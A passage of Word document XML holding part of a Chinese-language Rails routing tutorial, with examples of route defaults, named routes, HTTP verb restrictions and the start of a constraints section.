            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>match 'photos/:id'</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; 'photos#show'</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="0983B2F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将会因为这条规则而把接收到的路径 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>/photos/12</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> ，匹配到 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>PhotosController</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 下面的 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>show</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 里面去。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C753A2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你还可以通过提供一个 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:defaults</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的散列来指定一个你默认存在的动态片段。例如：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8522"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="78FF7F73" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5845634E" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="2094274311"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>match 'photos/:id'</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; 'photos#show', :defaults</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; { :format</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; 'jpg'</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>}</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7CC94FF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这样 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>photos/12</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的路径就会匹配到 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>PhotosController</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>show</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 行为， </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>params[:format]</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 会被设置为 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>"jpg"</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="520EAECB"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3.6 命名路由</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="185494C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你可以用 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:as</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 参数来定义一个路由的名字。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6216"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="2EBC4EE9" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7FDBCFB5" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="573315843"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>match 'exit'</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; 'sessions#destroy', :as</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; :logout</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="092C19B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这样在应用程序中产生的 Helper 就将会是 create </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>logout_path</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 和 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>logout_url</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">。而调用了 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>logout_path</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 就会返回 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>/exit</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 路径。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BE41A02"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3.7 HTTP 动词约定</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78C6C15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你可以用 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:via</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 选项来限定一个请求能相应的一个或者多个 HTTP 方法：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6216"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="47384830" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7BF37E11" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="370423429"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>match 'photos/show'</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; 'photos#show', :via</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; :get</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="5536369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简写作：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2256"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="5A516DCF" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1BD876C7" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="1245720588"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>get 'photos/show'</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="00EE7CE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你也可以将多个动词行为绑定到一条路由规则上去：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7296"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="6107119E" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="583AC0E6" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="1315839970"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>match 'photos/show'</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; 'photos#show', :via</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; [:get, :post]</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="673BCC70"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3.8 部分正则约定</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C1ED00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你可以使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:constraints</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 选项来对动态路径部分强制性的匹配：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8522"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="12B79A4A" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4520B474" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="1761441942"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>match 'photos/:id'</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; 'photos#show', :constraints</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; { :id</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
